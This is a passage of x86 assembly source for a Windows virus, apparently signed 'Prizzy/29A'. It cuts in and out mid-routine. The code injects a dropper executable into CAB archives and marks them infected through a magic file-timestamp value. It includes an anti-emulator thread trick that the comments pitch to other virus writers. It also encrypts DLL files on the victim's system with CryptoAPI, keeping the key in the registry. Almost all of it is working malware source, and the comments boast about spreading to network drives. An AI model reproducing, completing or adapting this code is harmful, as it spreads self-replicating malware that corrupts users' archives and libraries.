		mov	edx,[ebp+__iCAB_fMemory]
		mov	ecx,[ebp+__iCAB_fFSize] ;number of bytes to read
		xor	esi,esi 		;file position
		mov	ebx,[ebp+__iCAB_fHandle];file handle
		call	__MyReadFile
		jc	__iCAB_dClose

		; check archive's header
		mov	edi,[ebp+__iCAB_fMemory]
		cmp	[edi],'FCSM'		;"MSCF" signature ?
		jnz	__iCAB_dClose
		cmp	word ptr [edi]. \
			(CABh_VersionMin - CAB_h_struct),0103h
		jnz	__iCAB_dClose

		; get volume number - I want only 1st volume
		cmp	word ptr [edi]. \
			(CABh_Number - CAB_h_struct),0000h
		jnz	__iCAB_dClose

		; set ESI on the first entry
		movzx	esi,word ptr [edi]. (CABh_FirstRec - CAB_h_struct)
		add	esi,[ebp+__iCAB_fMemory]

		; modify folder's starts
		push	esi
		movzx	ebx,word ptr [edi]. (CABh_nFolders - CAB_h_struct)
	__iCAB_modify:
		or	ebx,ebx
		jz	__iCAB_modified
		sub	esi,(CAB_file_start - CAB_directory_start)
		mov	eax,(CAB_entry - CAB_directory_start) - (8+1+3)
		add	eax,[ebp+__iCAB_nChars]
		add	dword ptr [esi]. \
			(CABd_FirstRec - CAB_directory_start),eax
		dec	ebx
		jmp	__iCAB_modify
	__iCAB_modified:
		pop	esi

		; make place for new folder
		push	edi
		mov	edi,esi
		add	edi,(CAB_file_start - CAB_directory_start)
		mov	ecx,[ebp+__iCAB_fFSize]
		add	ecx,[ebp+__iCAB_fMemory]
		sub	ecx,esi
		call	__movsd_back
		pop	edi

		; save offset - ESI=place of the new folder
		add	esi,00000004h
		mov	[ebp+__iCAB_myFolder],esi	;modify later

		; get number of files and calculate my new file position
		movzx	eax,word ptr [edi]. (CABh_nFiles - CAB_h_struct)
		push	eax
		call	ppe_get_rnd_range
		inc	eax
		xchg	eax,edx
		push	edx

		; modify all file structs in CAB archive
		add	esi,(CAB_file_start - CAB_directory_start)
		push	edi
		mov	edi,esi
	__iCAB_search:
		or	edx,edx
		jz	__iCAB_searched
		add	edi,(CABf_FileName - CAB_file_start)
		mov	ecx,-1
		xor	al,al
		repnz	scasb
		dec	edx
		jmp	__iCAB_search
	__iCAB_searched:
		mov	esi,edi
		pop	edi

		; update file in folder
		mov	dx,[edi].(CABh_nFolders - CAB_h_struct)

		; make place for new file struct
		push	edi
		mov	edi,esi
		add	edi,(CAB_entry - CAB_file_start) - (8+1+3)
		add	edi,[ebp+__iCAB_nChars] ;new file name length
		mov	ecx,[ebp+__iCAB_fFSize]
		add	ecx,[ebp+__iCAB_fMemory]
		add	ecx,(CAB_file_start - CAB_directory_start)
		sub	ecx,esi
		call	__movsd_back

		; set some values to file header
		mov	eax,[ebp+__iCAB_dFSize] ;drropper's file size
		mov	word ptr [ebp+CABe_Compr],ax
		mov	word ptr [ebp+CABe_UnCompr],ax
		mov	[ebp+CABf_UnCompSize],eax

		; save offset of the file struct
		add	esi,00000004h
		mov	edi,esi
		lea	esi,[ebp+CAB_file_start]
		mov	[esi].(CABf_Flags - CAB_file_start),dx
		mov	ecx,(CAB_entry - CAB_file_start) - (8+1+3)
		add	ecx,[ebp+__iCAB_nChars]
		rep	movsb
		mov	esi,edi
		pop	edi

		; modify files - ESI=next file struct
		pop	edx
		pop	ebx
		sub	ebx,edx 		;files to modify
		push	edi
		mov	edi,esi
	__iCAB_search_2:
		or	ebx,ebx
		jz	__iCAB_searched_2
		add	edi,(CABf_FileName - CAB_file_start)
		mov	ecx,-1
		xor	al,al
		repnz	scasb
		dec	ebx
		jmp	__iCAB_search_2
	__iCAB_searched_2:
		pop	edi

		; change CAB header
		inc	word ptr [edi]. \	;add new folder
			(CABh_nFolders - CAB_h_struct)
		inc	word ptr [edi]. \	;add new files
			(CABh_nFiles - CAB_h_struct)
		add	dword ptr[edi]. \
			(CABh_FirstRec - CAB_h_struct), \
			CAB_file_start - CAB_directory_start
		mov	eax,[ebp+__iCAB_dFSize]
		add	eax,[ebp+__iCAB_nChars]
		add	eax,(CAB_entry - CAB_file_start) - (8+1+3)
		add	dword ptr[edi]. \
			(CABh_FileSize - CAB_h_struct),eax

		; change folder's values
		mov	edi,[ebp+__iCAB_myFolder]
		mov	eax,[ebp+__iCAB_fFSize]
		add	eax,(CAB_entry - CAB_directory_start) -  (8+1+3)
		add	eax,[ebp+__iCAB_nChars]
		mov	[edi],eax		;offset to the 1st entry
		mov	word ptr [edi+4],0001h	;number of blocks
		mov	word ptr [edi+6],0000h	;type of compress

		; create new block and copy dropper
		mov	edi,[ebp+__iCAB_fMemory]
		add	edi,[ebp+__iCAB_fFSize]
		add	edi,(CAB_entry - CAB_directory_start) - (8+1+3)
		add	edi,[ebp+__iCAB_nChars]
		lea	esi,[ebp+CAB_entry]		;create new block
		mov	ecx,(CABe_Compr_data - CAB_entry)
		rep	movsb

		mov	edx,edi 			;copy my dropper
		mov	ecx,[ebp+__iCAB_dFSize]
		xor	esi,esi
		mov	ebx,[ebp+__iCAB_dHandle]
		call	__MyReadFile
		jc	__iCAB_dClose

		; "update" headers + whole file + dropper
		mov	edx,[ebp+__iCAB_fMemory]
		add	ecx,edi
		sub	ecx,edx
		xor	esi,esi
		mov	ebx,[ebp+__iCAB_fHandle]
		call	__MyWriteFile

		; archive has been infected
		mov	ebx,[ebp+__iCAB_fHandle]
		call	__set_archive_infected

	__iCAB_dClose:
		mov	eax,[ebp+__iCAB_fMemory]
		call	mdealloc
		mov	ebx,[ebp+__iCAB_dHandle]
		call	__MyCloseFile
	__iCAB_fClose:
		mov	ebx,[ebp+__iCAB_fHandle]
		call	__MyCloseFile

	__iCAB_finish:
		ret

;ÄÄÄ´ common archivez operations ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;Check whether archive	has been  infected. This  function
		;reads	its time and  calculate whether  isn't divided	by
		;magic number (for this virus it is 117).
		;
		;  input:
		;	     EBX ... file handle
		;  output:
		;	     CFlags
		;
__get_archive_infected:

		; get archive file time
		lea	eax,[ebp+FileTime]
		push	eax			;LastWriteTime
		push	00000000h		;LastAccessTime
		push	00000000h		;CreationTime
		push	ebx			;file handle
		call	[ebp+ddGetFileTime]
		or	eax,eax
		jz	__gai_failed

		; convert "FileTime" to "SystemTime"
		lea	eax,[ebp+SystemTime]	;SystemTime structure
		push	eax
		lea	eax,[ebp+FileTime]	;FileTime structure
		push	eax
		call	[ebp+ddFileTimeToSystemTime]

		; hours, minutes, seconds, milliseconds add up
		lea	esi,word ptr [ebp+SystemTime]
		mov	ecx,(size SystemTime - 2) / 2
		xor	ebx,ebx
	__gai_calculate:
		lodsw
		add	ebx,eax
		dec	ecx
		jnz	__gai_calculate
		sub	ebx,1990
		sub	bx,word ptr [ebp+SystemTime.wDayOfWeek]

		xchg	eax,ebx
		call	__check_infected
		jnc	__gai_failed

		test	al,0F9h 		;hidden STC instruction
	__gai_failed	equ $-1
		ret

		;---------------------------------------------------------
		;This function set 117 value among Year, Month, Day, Hour,
		;Minute and Second value  by FileTime. At first I will put
		;random values there and then I will modify it once again.
		;
		;  input:
		;	     EBX ... file handle
		;

		; TimeBuffer:
		;		1st value = offset in SystemTime struct
		;		2nd value = max of generate number
		;		3rd value = increase generate number
		__sai_TimeBuffer db	0,10,0,  2,12,1,  6,30,1,  8,24,0
				 db    10,60,0, 12,60,0
		__sai_counter	 dd    00000000h
		;
__set_archive_infected:

		push	ebx

		; divide that number to Year, Month, Day, Hour, Minute...
	__sai_restart:
		lea	edi,[ebp+__sai_TimeBuffer]
		lea	edx,[ebp+SystemTime]
		mov	esi,117
		xor	ecx,ecx
	__sai_again:
		movzx	ebx,byte ptr [edi+ecx]	;offset in SystemTime struct
		movzx	eax,byte ptr [edi+ecx+1];generate number
		call	ppe_get_rnd_range
		cmp	byte ptr [edi+ecx+2],1
		jnz	__sai_loop
		inc	eax
	__sai_loop:
		mov	[edx+ebx],ax
		sub	esi,eax
		add	ecx,3
		cmp	ecx,3*6
		jnz	__sai_again

		; only even seconds
		test	[ebp+SystemTime].wSecond,1
		jnz	__sai_restart

		test	esi,80000000h
		jnz	__sai_restart
		or	esi,esi
		jz	__sai_continue

		; increase/decrease some value from SystemTime
	__sai_next_loop:
		lea	edi,[ebp+__sai_TimeBuffer]
		lea	edx,[ebp+SystemTime]
	__sai_new_value:
		mov	[ebp+__sai_counter],2		;disable Year
	__sai_next_value:
		xor	ecx,ecx 			;start of scaning
	__sai_next_round:
		add	ecx,3				;disable Year or
		movzx	eax,byte ptr [edi+ecx]		;next value
		movzx	ebx,byte ptr [edi+ecx+1]
		cmp	eax,[ebp+__sai_counter] 	;the right value
		jnz	__sai_next_round
		dec	bx				;'ceuse of gen. n.
		cmp	[edx+eax],bx
		jz	__sai_fulled

		inc	word ptr [edx+eax]		;increase value
		dec	esi				;decrease counter

	__sai_fulled:
		or	esi,esi 			;finish ?
		jz	__sai_continue
	__sai_disable_value:
		add	[ebp+__sai_counter],00000002h	;next value in ST
		cmp	[ebp+__sai_counter],00000004h	;"Day Of Week" value?
		jz	__sai_disable_value		;if yes, disable it
		cmp	[ebp+__sai_counter],0000000Ch	;"Second" value ?
		jz	__sai_disable_value		;if yes, disable it

		cmp	[ebp+__sai_counter],7*2 	;end of table ?
		jnz	__sai_next_value
		jmp	__sai_new_value

	__sai_continue:
		xor	eax,eax
		mov	[ebp+SystemTime].wMilliseconds,ax
		add	[ebp+SystemTime].wYear,1990

		; convert "SystemTime" to "FileTime"
		lea	eax,[ebp+FileTime]	;FileTime structure
		push	eax
		lea	eax,[ebp+SystemTime]	;SystemTime structure
		push	eax
		call	[ebp+ddSystemTimeToFileTime]

		; set FileTime
		pop	ebx			;file handle
		lea	eax,[ebp+FileTime]
		push	eax			;LastWriteTime
		push	00000000h		;LastAccessTime
		push	00000000h		;CreationTime
		push	ebx			;file handle
		call	[ebp+ddSetFileTime]
		or	eax,eax
		jz	__sai_failed

	__sai_failed:
		ret

		;---------------------------------------------------------
		;This function generates FileName to archive.
		;
		;  input:
		;	     EDI ... where put new name (maximum=8+1+3)
		;  output:
		;	     EAX ... filename length
		;
generate_name:
		pusha
		cld
		lea	esi,[ebp+gen_archive_filename]
		mov	eax,gen_archive_number
		call	ppe_get_rnd_range
		mov	ecx,eax
	name_search:
		jecxz	name_found
		movzx	eax,byte ptr [esi+1]
		add	eax,00000002h
		add	esi,eax
		dec	ecx
		jmp	name_search
	name_found:
		mov	ebx,edi
		mov	al,byte ptr [esi]
		call	gen_spec_char
	no_gen_1:
		movzx	ecx,byte ptr [esi+1]
		add	esi,00000002h
		rep	movsb

		call	gen_spec_char
		mov	eax,'exe.'
		mov	[edi],eax
		add	edi,4
		mov	edx,edi
		sub	edx,ebx

		mov	ecx,8+1+3
		sub	ecx,edx
		xor	al,al
		rep	stosb

		movzx	edx,dl
		mov	[esp].access_eax,edx
		popa
		ret

	gen_spec_char:
		or	al,al
		jz	char_exit
		mov	eax,00000002h
		call	ppe_get_rnd_range
		or	al,al
		jz	char_exit
		mov	byte ptr [edi],'!'
		inc	edi
	char_exit:
		ret

		;---------------------------------------------------------
		;This function copy source place to  destination. So  that
		;it is MOVSD instruction with STD flag.
		;
		;  input:
		;	     ESI ... source place in memory
		;	     EDI ... destination place in memory
		;	     ECX ... number bytes to move
		;
		;Note: ESI, EDI ain't real addresses- to understand see on
		;      the first four instructions.
		;
__movsd_back:
		add	esi,ecx 		;This code has been stolen
		dec	esi			;from CiA 1.50 sources.
		add	edi,ecx
		dec	edi			;(c)oded by Dement
		std				;dement@email.cz
		shr	ecx,01h
		jnc	__mb_nomovsb
		movsb
	__mb_nomovsb:
		jz	__mb_finish
		dec	esi
		dec	edi
		shr	ecx,01h
		jnc	__mb_nomovsw
		movsw
		jz	__mb_finish
	__mb_nomovsw:
		sub	esi,00000002h
		sub	edi,00000002h
		rep	movsd			;copy me - I wanna travel
	__mb_finish:
		cld
		ret

;ÄÄÄ´ function to actualize compressed programs ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function was called itself from  Hyper Infection and
		;it means the extension has been found.
		;
		;  input:    EDX ... file name
		;	     EAX ... input parameter (pointer into table)
		;	     EBX ... next filename in HyperTable
archive_act:

		; for more information about EAX (tables), find "AProgram"
		; structure

		; save registers & load EAX parameter
		pusha
		mov	esi,eax
		add	esi,ebp

		; calculate filename length and allocate memory
		call	__get_last_char
		sub	edi,edx
		push	edi			;filename length
		add	edi,filename_size

		mov	eax,edi
		call	malloc
		mov	[esi.program],eax	;save destination place

		; copy filename there
		mov	esi,edx
		mov	edi,eax
		pop	ecx			;filename length
		rep	movsb

		; disable this archive program
		mov	byte ptr [ebx-HyperTable_HalfSize],01h

		; restore registers
		popa
		ret

;ÄÄÄ´ threads ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;------------------------------------------------------------------------
; Anti-emulators:
;
;   Welcome everybody who wanna use this method in your viruses. At first
;   I hope you know whats "thread" and "fiber" (see Benny's tutorial). So
;   you active "__thread_1" which it'll patch your original code on NOPs,
;   and after that, who will write that original code there ?
;
;	    __thread_1_begin:
;			jmp	$	       ;instead this will be NOPs
;
;   And by "@ANTI_E_START" macro  you  will PUSH that original values and
;   then by "@ANTI_E_FINISH" you will restore  those values. Try to debug
;   this source and you'll understand it or send me mail.
;

		;--------------------------------------------------------
		;This thread rewrite some bytes. Common anti-emulator.
		;
		;  (__MyCreateThread)
		;  input:
		;    EAX ... address of this function (__thread_1)
		;    EBX ... information
		;	       * upper imm8 reg ... bytes to patch
		;	       * where from here (offset)
		;
__thread_1:
		push	eax ecx ebp
		call	get_base_ebp
		mov	eax,[esp+00000010h]	;get thread parameter
		mov	ecx,eax
		shr	ecx,18h 		;get last imm8 reg
		and	eax,00FFFFFFh
		add	eax,ebp
	__thread_1_loop:
		mov	byte ptr [eax],90h	;patch it
		inc	eax			;next byte to patch :)
		loop	__thread_1_loop
		pop	ebp ecx eax
		ret

;ÄÄÄ´ function to Win32 Cryptography APIs startup ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;At last, at last I start to code this function, at last !
		;So, at first I must  check if "Prizzy/29A" key exists. If
		;not, I must create it. Also I'll check whether Crypto API
		;functions exists in "ADVAPI32.DLL" file because  they are
		;from "Windows 95, OEM Service Release 2" and WinNT, sure!
		;I cant also decrypt DLL  files on network's disks because
		;I must store CSP  cryptography key in	register class and
		;on those disks I couldn't load that CSP public/simple key
		;from that register. But it  does not matter because I can
		;infect EXE files on network's disks. Hehehe - Im perfect!
		;
crypto_startup:

		mov	[ebp+crypto_Action  ],00000000h
		mov	[ebp+crypto_loadKey ],00000000h
		mov	[ebp+crypto_Provider],00000000h

		; check if cryptography functions has been found...
		cmp	[ebp+ddCryptAcquireContextA],00000000h
		jz	__cs_fault

		; get if crypto key exists in registers...
		push	00000000h		;Flags
		push	00000001h		;PROV_RSA_FULL
		push	00000000h		;provider name
		lea	eax,[ebp+crypto_KeyName]
		push	eax			;my special key
		lea	eax,[ebp+crypto_Provider]
		push	eax			;CSP provider
		call	[ebp+ddCryptAcquireContextA]
		or	eax,eax 		;does key exist ?
		jnz	__cs_continue

		; create new key
		push	00000008h		;CRYPT_NEWKEYSET
		push	00000001h		;PROV_RSA_FULL
		push	00000000h		;provider name
		lea	eax,[ebp+crypto_KeyName]
		push	eax			;my special key
		lea	eax,[ebp+crypto_Provider]
		push	eax			;CSP provider
		call	[ebp+ddCryptAcquireContextA]
		or	eax,eax
		jz	__cs_fault

		; register folder "Prizzy/29A" has been created or opened
		; now, check whether I have to generate CPS key
	__cs_continue:
		call	__cs_created_key
		jc	__cs_fault

		; generate CSP key for my... for my... for my purpose {:-)
		lea	eax,[ebp+crypto_Key]
		push	eax			;key's value
		push	00000001h		;CRYPT_EXPORTABLE
		push	00000001h		;AT_KEYEXCHANGE
		push	[ebp+crypto_Provider]
		call	[ebp+ddCryptGenKey]	;generate key
		or	eax,eax
		jz	__cs_fault

		; get handle to the key exchange
		lea	eax,[ebp+crypto_XchgKey]
		push	eax
		push	00000001h		;AT_KEYEXCHANGE
		push	[ebp+crypto_Provider]
		call	[ebp+ddCryptGetUserKey]

		; get a random block cipher session key
		lea	eax,[ebp+crypto_Key]
		push	eax
		push	00000001h		;CRYPT_EXPORTABLE
		push	00006602h		;CALG_RC2
		push	[ebp+crypto_Provider]
		call	[ebp+ddCryptGenKey]

		; determine size of key blob and allocate memory
		lea	eax,[ebp+crypto_BlobLen]
		push	eax
		push	00000000h
		push	00000000h
		push	00000001h		;SIMPLEBLOB
		push	[ebp+crypto_XchgKey]
		push	[ebp+crypto_Key]
		call	[ebp+ddCryptExportKey]	;get simple blob key length

		; allocate memory for SIMPLE key (maximum 256 bytes)
		mov	eax,[ebp+crypto_BlobLen]
		call	malloc
		mov	[ebp+crypto_BlobKey],eax

		; export key into a simple key blob
		lea	eax,[ebp+crypto_BlobLen]
		push	eax			;length of simple key
		push	[ebp+crypto_BlobKey]	;simple blob key buffer
		push	00000000h
		push	00000001h		;SIMPLEBLOB
		push	[ebp+crypto_XchgKey]
		push	[ebp+crypto_Key]
		call	[ebp+ddCryptExportKey]	;generate simple key

		; get other registery information
		lea	eax,[ebp+crypto_BlobHan]
		mov	ecx,80000001h		;HKEY_CURRENT_USER
		lea	esi,[ebp+crypto_Register]
		call	__regOpen
		jc	__cs_dealloc

		; create binary sub-key "Kiss Of Death" it'll be "SimpleKey"
		push	[ebp+crypto_BlobLen]	;size of value
		push	[ebp+crypto_BlobKey]	;address of data buffer
		push	00000003h		;REG_BINARY flag
		push	00000000h		;reserved
		lea	eax,[ebp+crypto_RegFlag]
		push	eax			;name of value
		push	[ebp+crypto_BlobHan]
		call	[ebp+ddRegSetValueExA]	;update it :)
		or	eax,eax
		jnz	__cs_dealloc_2

	__cs_close_reg:
		; close register
		push	[ebp+crypto_BlobHan]	;my register handle
		call	[ebp+ddRegCloseKey]

	__cs_close_key:
		; close cryptography key
		push	[ebp+crypto_Key]	;my generated key
		call	[ebp+ddCryptDestroyKey]

	__cs_finish:
		mov	eax,[ebp+crypto_Provider]
		or	eax,eax
		jz	__cs_end
		push	00000000h
		push	eax
		call	[ebp+ddCryptReleaseContext]
	    __cs_end:
		ret

	__cs_fault:
		mov	[ebp+crypto_Action],00000001h
		jmp	__cs_finish

	__cs_dealloc:
		mov	eax,[ebp+crypto_BlobKey]
		call	mdealloc
		mov	[ebp+crypto_Action],00000001h
		jmp	__cs_close_key

	__cs_dealloc_2:
		mov	eax,[ebp+crypto_BlobKey]
		call	mdealloc
		mov	[ebp+crypto_Action],00000001h
		jmp	__cs_close_reg


		;---------------------------------------------------------
		;This function	checks	whether "Kiss Of Death"  exists in
		;"Prizzy/29A" cryptography  register-class. All is because
		;of CSP generating public key.
		;
		__csck_regHan	dd	00000000h	;register handle
		__csck_regFlag	dd	00000000h	;register type flag
		;
	__cs_created_key:

		; open register folder "Prizzy/29A"
		lea	eax,[ebp+__csck_regHan]
		mov	ecx,80000001h		;HKEY_CURRENT_USER
		lea	esi,[ebp+crypto_Register]
		call	__regOpen
		jc	__csck_fault

		; open binary sub-key "Kiss Of Death"
		push	00000000h		;address of data buffer size
		push	00000000h		;address of data buffer
		mov	eax,00000003h
		lea	ebx,[ebp+__csck_regFlag]
		mov	[ebx],eax
		push	ebx			;REG_BINARY flag
		push	00000000h		;reserved
		lea	eax,[ebp+crypto_RegFlag]
		push	eax			;name of value
		push	[ebp+__csck_regHan]
		call	[ebp+ddRegQueryValueExA]
		or	eax,eax
		pushf
		  push	  [ebp+__csck_regHan]	;close register folder
		  call	  [ebp+ddRegCloseKey]
		popf
		jz	__csck_fault

		test	al,0F9h 		;hidden STC instruction
	__csck_fault	equ $-1
		ret

;ÄÄÄ´ function to crypt DLL file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function encrypts DLL file by Win32 Crypto functions
		;I will encode only two kilobytes.
		;
		;Behaviour:
		;  * load SIMPLE key from reg
		;  * read 2008 bytes from DLL to memory
		;  * encrypt 1992 bytes
		;  * save last eight bytes because when i'll encode next
		;    eight bytes, WinAPI rewrite 16 bytes, not 8.
		;  * encrypt 8 bytes (in fact, it will be 16 bytes)
		;  * calculate CRC64 for that 8 bytes
		;  * save CRC64 and that 8 bytes to the end of file
		;
		;
		;  input:    search_filename ... DLL file name
		;
		__cf_handle	dd	00000000h	;library's handle
		__cf_FSize	dd	00000000h	;library's file size
		__cf_Memory	dd	00000000h	;library's 2Kb body
		__cf_header	dw	0000h		;library's signature
		__cf_EncodeSize dd	00000000h	;real encoded size
		__cf_QwordCRC64 dq	00h		;Qword CRC64
		__cf_QWORD	dq	00h		;bad WinAPI function
		;
crypt_file:

		; don't call this function once again in actual time
		mov	dword ptr [ebp+crypto_thread],00000000h

		; check unCrypted DLLs
		mov	ebx,[ebp+filename_ptr]
		call	crypt_DLL_check
		jc	__cf_finish

		; check file, I don't wanna risk :) ["E:\XXXX\" directory]
	IFDEF DEBUG
		cmp	dword ptr [ebp+filename],'X\:E'
		jnz	__cf_finish
		cmp	dword ptr [ebp+filename+4],'\XXX'
		jnz	__cf_finish
	ENDIF

		; open DLL file
		mov	edx,[ebp+filename_ptr]
		call	__MyOpenFile
		jc	__cf_finish
		mov	[ebp+__cf_handle],eax

		; read its signature
		lea	edx,[ebp+__cf_header]	;destination place
		mov	ecx,00000002h		;bytes to read
		xor	esi,esi 		;file position
		mov	ebx,[ebp+__cf_handle]
		call	__MyReadFile
		jc	__cf_fClose

		; check its signature
		cmp	word ptr [ebp+__cf_header],'ZM'
		jnz	__cf_fClose

		; get its file size
		mov	ebx,[ebp+__cf_handle]
		call	__MyGetFileSize
		mov	[ebp+__cf_FSize],eax

		cmp	eax,5000		;lesser then 5Kb ?
		jb	__cf_fClose

		; allocate memory for 2 kilobytes
		mov	eax,2008
		call	malloc
		mov	[ebp+__cf_Memory],eax

		; read two kilobytes
		mov	edx,[ebp+__cf_Memory]	;destination place
		mov	ecx,2008		;number of bytes to read
		xor	esi,esi 		;file position
		mov	ebx,[ebp+__cf_handle]	;file handle
		call	__MyReadFile
		jc	__cf_dealloc

		; get PE/NE signature
		mov	eax,[ebp+__cf_Memory]
		add	eax,[eax.MZ_lfanew]
		cmp	word ptr [eax],'EP'	;no PE sign ?
		jnz	__cf_dealloc

		; encrypt 1992 bytes (next 8 bytes will be with last flag)
		mov	[ebp+__cf_EncodeSize],1992
		push	2000			;total bytes to encrypt
		lea	eax,[ebp+__cf_EncodeSize]
		push	eax			;real encoded size
		push	[ebp+__cf_Memory]	;mem address
		push	00000000h		;flags
		push	00000000h		;last block ?
		push	00000000h		;hash
		push	[ebp+__clk_hKey]	;imported key
		call	[ebp+ddCryptEncrypt]
		or	eax,eax
		jz	__cf_dealloc

		; save next two dwords to copro reg
		mov	eax,[ebp+__cf_Memory]
		fsave	[ebp+copro_nl_buffer]	;save all regz & flagz
		fild	qword ptr [eax+000007D0h]
		fistp	qword ptr [ebp+__cf_QWORD]
		frstor	[ebp+copro_nl_buffer]	;restore all regz & flagz

		; encode next 8 bytes
		mov	[ebp+__cf_EncodeSize],8
		push	2000			;total bytes to encrypt
		lea	eax,[ebp+__cf_EncodeSize]
		push	eax			;real encoded size
		mov	eax,[ebp+__cf_Memory]
		add	eax,1992
		push	eax			;mem address
		push	00000000h		;flags
		push	00000001h		;last block ?
		push	00000000h		;hash ?
		push	[ebp+__clk_hKey]	;imported key
		call	[ebp+ddCryptEncrypt]
		or	eax,eax
		jz	__cf_dealloc

		; save encypted data, what a dream {:-)
		mov	edx,[ebp+__cf_Memory]
		mov	ecx,2008		;number of bytes to write
		xor	esi,esi
		mov	ebx,[ebp+__cf_handle]
		call	__MyWriteFile
		jc	__cf_dealloc

		; get one DWORD from key and lose that value :)
		lea	eax,[ebp+__cf_QWORD]
		mov	ecx,00000008h		;QWORDs length
		push	eax			;buffer position
		mov	esi,eax 		;start of CRC64 calculating
		call	__bruteCRC64		;wow! get CRC64 for BlobKey
		mov	dword ptr [ebp+__cf_QwordCRC64],eax
		mov	dword ptr [ebp+__cf_QwordCRC64+00000004h],edx
		pop	esi
		xor	ebx,ebx
		mov	[esi],ebx		;clear that value :)

		; write replaced QWORD on the end of file
		lea	edx,[ebp+__cf_QwordCRC64]
		mov	ecx,00000010h
		mov	esi,[ebp+__cf_FSize]
		mov	ebx,[ebp+__cf_handle]
		call	__MyWriteFile
		jc	__cf_dealloc

	__cf_dealloc:
		mov	eax,[ebp+__cf_Memory]
		call	mdealloc
	__cf_fClose:
		mov	ebx,[ebp+__cf_handle]
		call	__MyCloseFile

	__cf_finish:
		jmp	__ct_finish		;go back to thread

;ÄÄÄ´ function to decrypt DLL file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function decrypts DLL file by WinAPI cryptography f.
		;
		;Behaviour:
		;  * load SIMPLE key from registers "Kiss Of Death" key :)
		;  * open DLL and read 2008 bytes, check 'MZ' if it's encr.
		;  * read 16 bytes, calculate right value by CRC64
		;  * decrypt the first part
		;  * decrypt the second part of DLL file body
		;  * replace de-CRC64 bytes (eight bytes)
		;  * truncate files - 16 bytes
		;
		;
		;  input:    filename_ptr ... DLL file name
		;
		__df_handle	dd	00000000h	;library's handle
		__df_header	dw	0000h		;library's signature
		__df_FSize	dd	00000000h	;library's file size
		__df_memory	dd	00000000h	;library's memory
		__df_decSize	dd	00000000h	;decode size
		;
		__df_CRC64	dq	00h		;CRC64 of lost qword
		__df_QWORD	dq	00h		;WinAPI lost qword
		;
decrypt_file:

		; don't call this function once again in actual time
		mov	dword ptr [ebp+crypto_thread],00000000h

		; check unCrypted DLLs
		mov	ebx,[ebp+filename_ptr]
		call	crypt_DLL_check
		jc	__df_finish

		; check file, I don't wanna risk :) ["E:\XXXX\" directory]
	IFDEF DEBUG
		mov	edx,[ebp+filename_ptr]
		cmp	dword ptr [edx],'X\:E'
		jnz	__df_finish
		cmp	dword ptr [edx+00000004h],'\XXX'
		jnz	__df_finish
	ENDIF

		; open DLL file
		mov	edx,[ebp+filename_ptr]
		call	__MyOpenFile
		jc	__df_finish
		mov	[ebp+__df_handle],eax

		; read two bytes and check whether library is crypted
		lea	edx,[ebp+__df_header]
		mov	ecx,00000002h		;two bytes to read
		xor	esi,esi 		;file position
		mov	ebx,[ebp+__df_handle]
		call	__MyReadFile
		jc	__df_finish

		cmp	[ebp+__df_header],'ZM'	;check library signature
		jz	__df_fClose

		; get library file size
		mov	ebx,[ebp+__df_handle]
		call	__MyGetFileSize
		mov	[ebp+__df_FSize],eax

		cmp	eax,5000		;lesser then 5Kb ?
		jb	__df_fClose

		; load CRC64 and WinAPI lost qword
		lea	edx,[ebp+__df_CRC64]
		mov	ecx,00000010h
		mov	esi,[ebp+__df_FSize]	;filesize
		sub	esi,ecx 		; - 10h (2*qword)
		mov	ebx,[ebp+__df_handle]
		call	__MyReadFile
		jc	__df_fClose

		; get real value from CRC64, by "brute-CRC64", i'm perfect !!
		lea	esi,[ebp+__df_QWORD]	;input buffer
		mov	ecx,00000008h		;lenght of buffer
		mov	eax,dword ptr [ebp+__df_CRC64]
		mov	edx,dword ptr [ebp+__df_CRC64+00000004h]
		call	__get_bruteCRC64

		; allocate memory for 2Kb
		mov	eax,2008
		call	malloc
		mov	[ebp+__df_memory],eax

		; read crypted bytes :)
		mov	edx,[ebp+__df_memory]	;destination buffer
		mov	ecx,2008		;only 2Kb
		xor	esi,esi
		mov	ebx,[ebp+__df_handle]
		call	__MyReadFile
		jc	__df_dealloc

		; decrypt the first part of DLL's body
		lea	eax,[ebp+__df_decSize]
		mov	dword ptr [eax],1992	;number of bytes to decrypt
		push	eax
		push	[ebp+__df_memory]	;address of buffer
		push	00000000h		;flags
		push	00000000h		;it isn't last block
		push	00000000h		;hash
		push	[ebp+__clk_hKey]	;imported key
		call	[ebp+ddCryptDecrypt]
		or	eax,eax
		jz	__df_dealloc

		; decrypt the second part of DLL's body
		lea	eax,[ebp+__df_decSize]
		mov	dword ptr [eax],8*2	;number of bytes to decrypt
		push	eax
		mov	eax,[ebp+__df_memory]
		add	eax,1992
		push	eax			;address of buffer
		push	00000000h		;flags
		push	00000001h		;is is last block
		push	00000000h		;hash
		push	[ebp+__clk_hKey]	;imported key
		call	[ebp+ddCryptDecrypt]
		or	eax,eax
		jz	__df_dealloc

		; restore re-written bytes by WinAPI :(
		mov	eax,[ebp+__df_memory]
		fsave	[ebp+copro_nl_buffer]	;save all regz & flagz
		fild	qword ptr [ebp+__df_QWORD]
		fistp	qword ptr [eax+2000]
		frstor	[ebp+copro_nl_buffer]	;restore all regz & flagz

		; write the first 2008 bytes to DLL :)
		mov	edx,[ebp+__df_memory]
		mov	ecx,2008
		xor	esi,esi
		mov	ebx,[ebp+__df_handle]
		call	__MyWriteFile
		jc	__df_dealloc

		; truncate last sixteen bytes
		push	00000000h
		push	00000000h
		mov	eax,[ebp+__df_FSize]
		sub	eax,00000010h
		push	eax			;new "End Of File"
		push	[ebp+__df_handle]
		call	[ebp+ddSetFilePointer]
		cmp	eax,-1
		jz	__df_dealloc

